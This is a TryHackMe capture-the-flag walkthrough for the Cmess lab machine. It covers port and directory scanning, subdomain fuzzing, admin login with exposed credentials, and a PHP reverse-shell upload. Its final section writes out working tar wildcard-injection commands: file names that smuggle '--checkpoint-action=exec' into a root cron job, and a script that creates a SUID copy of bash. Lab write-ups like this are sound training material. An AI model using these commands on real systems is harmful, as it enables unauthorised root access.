---
author: "0xt0pus"
title: "TryHackMe Cmess machine Walkthrough"
date: "2023-10-08"
description: "Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation."
tags: ["Tryhackme", "cmess", "Machine-Walkthrough"]
cover:
    image: "/writeups/Cmess-Tryhackme/cmess.png"
ShowToc: true
TocOpen: false
---

## Setup

The following entry is being added to the `/etc/hosts`.


```bash
10.10.57.136 cmess.thm
```

## Enumeration

Nmap all ports scan is being run. The following was the result of the scan.


```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ nmap 10.10.57.136 -p- --min-rate 2500
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:44 EDT
Warning: 10.10.57.136 giving up on port because retransmission cap hit (10).
Nmap scan report for cmess.thm (10.10.57.136)
Host is up (0.18s latency).
Not shown: 65507 closed tcp ports (conn-refused), 26 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds
```

So, port 22 and 80 are open. The version of services are being identified as shown.


```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ nmap -sV -sC 10.10.57.136 -p22,80    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:48 EDT
Nmap scan report for cmess.thm (10.10.57.136)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
|_  256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

Other than Gila CMS, there's nothing interesting.

The website running on port 80 is being explored and the following is the page with no interesting surface.

![](/writeups/Cmess-Tryhackme/1.png)

The content on port 80

Dirsearch is being run to find the directories in the target website. The following is result is being obtained.


```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ dirsearch -u http://10.10.57.136 --exclude-status=401,402,403,404

 
[16:56:01] Starting: 
[16:56:15] 200 -    4KB - /0                                                
[16:56:15] 200 -    4KB - /01                                               
[16:56:15] 200 -    4KB - /1.rar                                            
[16:56:15] 200 -    4KB - /1.htaccess                                       
[16:56:15] 200 -    4KB - /1.php
[16:56:15] 200 -    4KB - /1
[16:56:15] 200 -    4KB - /1.sql
[16:56:15] 200 -    4KB - /1.tar.bz2
[16:56:15] 200 -    4KB - /1.zip
[16:56:15] 200 -    4KB - /1.htpasswd                                       
[16:56:15] 200 -    4KB - /1.tar                                            
[16:56:15] 200 -    4KB - /1.tar.gz                                         
[16:56:15] 200 -    4KB - /1.txt
[16:56:16] 200 -    4KB - /1admin                                           
[16:56:16] 200 -    4KB - /1c/                                              
[16:56:16] 200 -    4KB - /1x1                                              
[16:56:17] 200 -    3KB - /About                                            
[16:56:21] 200 -    4KB - /Search                                           
[16:56:25] 200 -    3KB - /about                                            
[16:56:28] 200 -    2KB - /admin                                            
[16:56:29] 200 -    2KB - /admin/                                           
[16:56:29] 200 -    2KB - /admin/.config
[16:56:29] 200 -    2KB - /admin/.htaccess
[16:56:29] 200 -    2KB - /admin/_logs/access_log
[16:56:29] 200 -    2KB - /admin/?/login
[16:56:29] 200 -    2KB - /admin/_logs/access.log
[16:56:29] 200 -    2KB - /admin/_logs/access-log
[16:56:29] 200 -    2KB - /admin/_logs/error.log
[16:56:29] 200 -    2KB - /admin/_logs/error-log
[16:56:29] 200 -    2KB - /admin/_logs/err.log
[16:56:29] 200 -    2KB - /admin/_logs/error_log
[16:56:29] 200 -    2KB - /admin/_logs/login.txt
[16:56:29] 200 -    2KB - /admin/access.log
[16:56:29] 200 -    2KB - /admin/access.txt
[16:56:29] 200 -    2KB - /admin/access_log
[16:56:29] 200 -    2KB - /admin/account
[16:56:29] 200 -    2KB - /admin/account.aspx
[16:56:29] 200 -    2KB - /admin/account.jsp
[16:56:29] 200 -    2KB - /admin/admin-login.aspx
[16:56:29] 200 -    2KB - /admin/admin
[16:56:29] 200 -    2KB - /admin/account.js
[16:56:29] 200 -    2KB - /admin/admin-login
[16:56:29] 200 -    2KB - /admin/admin-login.jsp
[16:56:29] 200 -    2KB - /admin/account.html
[16:56:29] 200 -    2KB - /admin/account.php
[16:56:29] 200 -    2KB - /admin/admin-login.html
[16:56:29] 200 -    2KB - /admin/admin-login.php
[16:56:29] 200 -    2KB - /admin/admin.jsp
[16:56:29] 200 -    2KB - /admin/admin-login.js
[16:56:29] 200 -    2KB - /admin/admin.php
[16:56:29] 200 -    2KB - /admin/admin.aspx
[16:56:29] 200 -    2KB - /admin/admin.html
[16:56:29] 200 -    2KB - /admin/admin.js
[16:56:29] 200 -    2KB - /admin/admin/login
[16:56:29] 200 -    2KB - /admin/admin_login
[16:56:29] 200 -    2KB - /admin/admin_login.aspx
[16:56:29] 200 -    2KB - /admin/admin_login.jsp
[16:56:29] 200 -    2KB - /admin/admin_login.html
[16:56:29] 200 -    2KB - /admin/admin_login.php
[16:56:29] 200 -    2KB - /admin/admin_login.js
[16:56:29] 200 -    2KB - /admin/adminLogin
[16:56:29] 200 -    2KB - /admin/adminLogin.jsp
[16:56:29] 200 -    2KB - /admin/adminLogin.aspx
[16:56:29] 200 -    2KB - /admin/adminLogin.php
[16:56:29] 200 -    2KB - /admin/adminLogin.html
[16:56:29] 200 -    2KB - /admin/adminLogin.js
[16:56:29] 200 -    2KB - /admin/backup/
[16:56:29] 200 -    2KB - /admin/controlpanel.php
[16:56:29] 200 -    2KB - /admin/controlpanel.aspx
[16:56:29] 200 -    2KB - /admin/backups/
[16:56:29] 200 -    2KB - /admin/config.php
[16:56:29] 200 -    2KB - /admin/controlpanel.html
[16:56:29] 200 -    2KB - /admin/controlpanel.js
[16:56:29] 200 -    2KB - /admin/controlpanel.jsp
[16:56:29] 200 -    2KB - /admin/controlpanel
[16:56:29] 200 -    2KB - /admin/cp.php
[16:56:29] 200 -    2KB - /admin/cp
[16:56:29] 200 -    2KB - /admin/cp.jsp
[16:56:29] 200 -    2KB - /admin/cp.aspx
[16:56:29] 200 -    2KB - /admin/cp.html
[16:56:29] 200 -    2KB - /admin/db/
[16:56:29] 200 -    2KB - /admin/default.asp
[16:56:29] 200 -    2KB - /admin/cp.js
[16:56:29] 200 -    2KB - /admin/default
[16:56:29] 200 -    2KB - /admin/default/admin.asp
[16:56:29] 200 -    2KB - /admin/download.php
[16:56:29] 200 -    2KB - /admin/error.log
[16:56:29] 200 -    2KB - /admin/error_log
[16:56:29] 200 -    2KB - /admin/error.txt
[16:56:29] 200 -    2KB - /admin/FCKeditor
[16:56:29] 200 -    2KB - /admin/default/login.asp
[16:56:29] 200 -    2KB - /admin/dumper/
[16:56:29] 200 -    2KB - /admin/export.php
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php
[16:56:29] 200 -    2KB - /admin/file.php
[16:56:29] 200 -    2KB - /admin/files.php
[16:56:29] 200 -    2KB - /admin/home.php
[16:56:29] 200 -    2KB - /admin/home
[16:56:29] 200 -    2KB - /admin/home.aspx
[16:56:29] 200 -    2KB - /admin/home.html
[16:56:29] 200 -    2KB - /admin/home.js
[16:56:29] 200 -    2KB - /admin/home.jsp
[16:56:29] 200 -    2KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[16:56:29] 200 -    2KB - /admin/index.php
[16:56:29] 200 -    2KB - /admin/index.html
[16:56:29] 200 -    2KB - /admin/index
[16:56:29] 200 -    2KB - /admin/js/tinymce
[16:56:29] 200 -    2KB - /admin/index.jsp
[16:56:29] 200 -    2KB - /admin/js/tiny_mce
[16:56:29] 200 -    2KB - /admin/includes/configure.php~
[16:56:29] 200 -    2KB - /admin/js/tiny_mce/
[16:56:29] 200 -    2KB - /admin/index.aspx
[16:56:29] 200 -    2KB - /admin/log
[16:56:29] 200 -    2KB - /admin/index.js
[16:56:29] 200 -    2KB - /admin/login
[16:56:29] 200 -    2KB - /admin/login.php
[16:56:29] 200 -    2KB - /admin/login.aspx
[16:56:29] 200 -    2KB - /admin/login.html
[16:56:29] 200 -    2KB - /admin/login.js
[16:56:29] 200 -    2KB - /admin/login.jsp
[16:56:29] 200 -    2KB - /admin/login.asp
[16:56:29] 200 -    2KB - /admin/login.do
[16:56:29] 200 -    2KB - /admin/login.htm
[16:56:29] 200 -    2KB - /admin/login.py
[16:56:29] 200 -    2KB - /admin/login.rb
[16:56:29] 200 -    2KB - /admin/logon.jsp
[16:56:29] 200 -    2KB - /admin/logs/access-log
[16:56:29] 200 -    2KB - /admin/logs/
[16:56:29] 200 -    2KB - /admin/logs/access.log
[16:56:29] 200 -    2KB - /admin/logs/err.log
[16:56:29] 200 -    2KB - /admin/logs/access_log
[16:56:29] 200 -    2KB - /admin/logs/error-log
[16:56:29] 200 -    2KB - /admin/logs/error.log
[16:56:29] 200 -    2KB - /admin/logs/error_log
[16:56:29] 200 -    2KB - /admin/manage.asp
[16:56:29] 200 -    2KB - /admin/js/tinymce/
[16:56:29] 200 -    2KB - /admin/manage/admin.asp
[16:56:29] 200 -    2KB - /admin/logs/login.txt
[16:56:29] 200 -    2KB - /admin/manage/login.asp
[16:56:29] 200 -    2KB - /admin/mysql2/index.php
[16:56:30] 200 -    2KB - /admin/manage
[16:56:30] 200 -    2KB - /admin/phpMyAdmin
[16:56:30] 200 -    2KB - /admin/mysql/
[16:56:30] 200 -    2KB - /admin/phpmyadmin/
[16:56:30] 200 -    2KB - /admin/mysql/index.php
[16:56:30] 200 -    2KB - /admin/phpMyAdmin/index.php
[16:56:30] 200 -    2KB - /admin/phpmyadmin/index.php
[16:56:30] 200 -    2KB - /admin/PMA/index.php
[16:56:30] 200 -    2KB - /admin/phpMyAdmin/
[16:56:30] 200 -    2KB - /admin/phpmyadmin2/index.php
[16:56:30] 200 -    2KB - /admin/pma/
[16:56:30] 200 -    2KB - /admin/pMA/
[16:56:30] 200 -    2KB - /admin/pma/index.php
[16:56:30] 200 -    2KB - /admin/private/logs
[16:56:30] 200 -    2KB - /admin/portalcollect.php?f=http://xxx&t=js
[16:56:30] 200 -    2KB - /admin/pol_log.txt
[16:56:30] 200 -    2KB - /admin/release
[16:56:30] 200 -    2KB - /admin/secure/logon.jsp
[16:56:30] 200 -    2KB - /admin/scripts/fckeditor
[16:56:30] 200 -    2KB - /admin/signin
[16:56:30] 200 -    2KB - /admin/sxd/
[16:56:30] 200 -    2KB - /admin/tiny_mce
[16:56:30] 200 -    2KB - /admin/sqladmin/
[16:56:30] 200 -    2KB - /admin/sysadmin/
[16:56:30] 200 -    2KB - /admin/upload.php
[16:56:30] 200 -    2KB - /admin/uploads.php
[16:56:30] 200 -    2KB - /admin/tinymce
[16:56:30] 200 -    2KB - /admin/web/
[16:56:30] 200 -    2KB - /admin/user_count.txt                             
[16:56:44] 200 -    0B  - /api                                              
[16:56:44] 200 -    0B  - /api/jsonws/invoke                                
[16:56:44] 200 -    0B  - /api/package_search/v4/documentation              
[16:56:44] 200 -    0B  - /api/login.json
[16:56:44] 200 -    0B  - /api/swagger
[16:56:44] 200 -    0B  - /api/swagger.yml                                  
[16:56:44] 200 -    0B  - /api/v2/helpdesk/discover
[16:56:44] 200 -    0B  - /api/swagger-ui.html
[16:56:44] 200 -    0B  - /api/v1
[16:56:44] 200 -    0B  - /api/error_log
[16:56:44] 200 -    0B  - /api/jsonws                                       
[16:56:44] 200 -    0B  - /api/
[16:56:44] 200 -    0B  - /api/2/explore/
[16:56:44] 200 -    0B  - /api/2/issue/createmeta                           
[16:56:45] 200 -    0B  - /api/v3
[16:56:45] 200 -    0B  - /api/v2
[16:56:46] 200 -  566B  - /assets/                                          
[16:56:46] 301 -  324B  - /assets  ->  http://10.10.57.136/assets/?url=assets
[16:56:47] 200 -    4KB - /author                                           
[16:56:50] 200 -    4KB - /blog/                                            
[16:56:50] 200 -    4KB - /blog                                             
[16:56:51] 200 -    4KB - /category                                         
[16:57:05] 200 -  735B  - /feed                                             
[16:57:10] 200 -    4KB - /index                                            
[16:57:13] 301 -  318B  - /lib  ->  http://10.10.57.136/lib/?url=lib        
[16:57:14] 301 -  318B  - /lib/tinymce  ->  http://10.10.57.136/lib/tinymce/
[16:57:15] 301 -  318B  - /log  ->  http://10.10.57.136/log/?url=log        
[16:57:15] 200 -    2KB - /login                                            
[16:57:15] 200 -    2KB - /login/                                           
[16:57:16] 200 -    2KB - /login/admin/                                     
[16:57:16] 200 -    2KB - /login/cpanel.php                                 
[16:57:16] 200 -    2KB - /login/administrator/
[16:57:16] 200 -    2KB - /login/cpanel.js
[16:57:16] 200 -    2KB - /login/cpanel/
[16:57:16] 200 -    2KB - /login/cpanel.aspx
[16:57:16] 200 -    2KB - /login/cpanel.jsp
[16:57:16] 200 -    2KB - /login/index
[16:57:16] 200 -    2KB - /login/admin/admin.asp
[16:57:16] 200 -    2KB - /login/cpanel.html
[16:57:16] 200 -    2KB - /login/login
[16:57:16] 200 -    2KB - /login/oauth/
[16:57:16] 200 -    2KB - /login/super
[16:57:32] 200 -   65B  - /robots.txt                                       
[16:57:33] 200 -    4KB - /search                                           
[16:57:37] 301 -  322B  - /sites  ->  http://10.10.57.136/sites/?url=sites  
[16:57:38] 301 -  318B  - /src  ->  http://10.10.57.136/src/?url=src        
[16:57:41] 200 -    4KB - /tag                                              
[16:57:41] 200 -    3KB - /tags                                             
[16:57:42] 301 -  324B  - /themes  ->  http://10.10.57.136/themes/?url=themes
[16:57:43] 301 -  318B  - /tmp  ->  http://10.10.57.136/tmp/?url=tmp        
[16:57:50] 200 -    4KB - /wp-content/plugins/jrss-widget/proxy.php?url=    
                                                                             
Task Completed 
```

The directories are being explore, but majority of the pages can be accessed after authentication. We need to find email and password to access the administrator page.

![](/writeups/Cmess-Tryhackme/2.png)



Subdomains are being enamurated with the wfuzz tool. The result is being showed below.

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hw 290 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"                                                                                                                                                                      

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0

```

The dev.cmess.thm is interesting, it is being added to /etc/hosts as given below.


```bash
10.10.57.136 dev.cmess.thm
```

The following is the content of this sub-domain.

![](/writeups/Cmess-Tryhackme/3.png)



## Gaining Access

The dev page seems to be a conversation between andre and support. The password of andre is exposed here. This password is being tried to ssh into the machine but it gave me that the password is incorrect.

So, the credentials are being tried at the Gila CMS admin login page. It worked and the admin page is being accessed.

![](/writeups/Cmess-Tryhackme/4.png)



Here under `content>file manager` there is an option to upload file. A php reverse shell is being upload here. There's no restriction on file upload.

The uploaded file can be accessed in the `cmess.thm/assets/revshell.php`.

A reverse shell is being obtained as show below:

![](/writeups/Cmess-Tryhackme/5.png)


Rev shell obtained

## Privilege Escalation

Currently, we are in the machine as `www-data` user. The `linenum.sh` is being transferred to the machine and is being run. It gave us a password backup file as shown.

![](/writeups/Cmess-Tryhackme/6.png)


Escalated to the user andre by running `su andre` , followed by the found password. As the current shell is not stable, we already got the password of andre, so connected to ssh with the credentials.

The user andre is being accessed as shown below:

![](/writeups/Cmess-Tryhackme/7.png)

Got user access. 

For getting root, the machine is being explored as the user andre.

There is a cronjob running, which is running after each 2 minutes and using wildcard with tar, it can used for getting root.

![](/writeups/Cmess-Tryhackme/8.png)



The following command is being run which will create a script that will copy the shell to the temp and will enable its suid bit.


```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
```

A checkpoint file is being created in the folder that will be backed up:


```bash
touch /home/andre/backup/--checkpoint=1
```

The following command will execute the script that is copying the shell to /tmp as root.


```bash
touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
```

Waited 2 minutes for the script to be executed,, and run the run the copied shell with command `/tmp/bash -p`

![](/writeups/Cmess-Tryhackme/9.png)


The machine is being rooted.

In this way, the root access is being obtained.

## Conclusion

The difficulty level of the machine was medium. The machine contains exposed password of user andre which can be used to access the admin panel. The admin panel has no restriction on file upload, and the files on the server can be run directly. For the privilege escalation, the machine again has exposed password of the user andre, which can be used for accessing the adre user from www-data. The root user can obtained by abusing the cronjobs.

